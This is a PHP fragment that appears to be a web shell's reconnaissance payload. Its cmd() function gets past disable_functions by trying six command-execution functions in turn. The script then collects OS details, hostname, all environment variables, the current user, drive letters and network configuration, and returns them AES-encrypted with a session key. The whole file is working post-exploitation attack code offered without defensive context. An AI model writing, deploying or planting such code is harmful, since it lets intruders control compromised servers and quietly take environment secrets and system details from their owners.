
function getSafeStr($str)
{
    $s1 = iconv('utf-8', 'gbk//IGNORE', $str);
    $s0 = iconv('gbk', 'utf-8//IGNORE', $s1);
    return $s0 == $str ? $s0 : iconv('gbk', 'utf-8//IGNORE', $str);
}

function cmd($cmd)
{
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('max_execution_time', 0);
    $exec_result = "";
    $disab_func = @ini_get('disable_functions') ? @ini_get('disable_functions') : array();
    if (!empty($disab_func)) {
        $disab_func = preg_replace('/[, ]+/', ',', $disab_func);
        $disab_func = array_map('trim', explode(',', $disab_func));
    }
    //$cmd = $cmd . (stristr(PHP_OS, "win") ? "" : " 2>&1\n");
    if (is_callable('system') && !in_array('system', $disab_func)) {
        ob_start();
        system($cmd);
        $exec_result = ob_get_contents();
        ob_end_clean();
    } elseif (is_callable('proc_open') && !in_array('proc_open', $disab_func)) {
        $handle = proc_open($cmd, array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')), $pipes);
        while (!feof($pipes[1])) {
            $exec_result .= fread($pipes[1], 1024);
        }
        @proc_close($handle);
    } elseif (is_callable('passthru') && !in_array('passthru', $disab_func)) {
        ob_start();
        passthru($cmd);
        $exec_result = ob_get_contents();
        ob_end_clean();
    } elseif (is_callable('shell_exec') && !in_array('shell_exec', $disab_func)) {
        $exec_result = shell_exec($cmd);
    } elseif (is_callable('exec') && !in_array('exec', $disab_func)) {
        $exec_result = array();
        exec($cmd, $exec_result);
        $exec_result = join("\n", $exec_result) . "\n";
    } elseif (is_callable('popen') && !in_array('popen', $disab_func)) {
        $fp = popen($cmd, 'r');
        if (is_resource($fp))
            while (!feof($fp))
                $exec_result .= fread($fp, 1024);
        @pclose($fp);
    }
    return getSafeStr($exec_result);
}

error_reporting(0);
$key = $_SESSION['key'];
session_write_close();
$data = array(
    "os" => php_uname("s"),
    "host" => php_uname("n"),
    "phpVersion" => phpversion(),
    "env" => getenv(),
    "ipInfo" => "",
    "driveList" => array(),
    "user" => trim(cmd("whoami")),
    "currentPath" => getSafeStr(__DIR__)
);
for ($i = 65; $i <= 90; $i++) {
    $drive = chr($i) . ':/';
    if (file_exists($drive))
        array_push($data["driveList"], $drive);
}
$data["ipInfo"] = str_replace("\r\n\r\n", "\r\n", cmd("ipconfig"));
echo openssl_encrypt(base64_encode(json_encode($data)), "aes-256-ecb", $key);
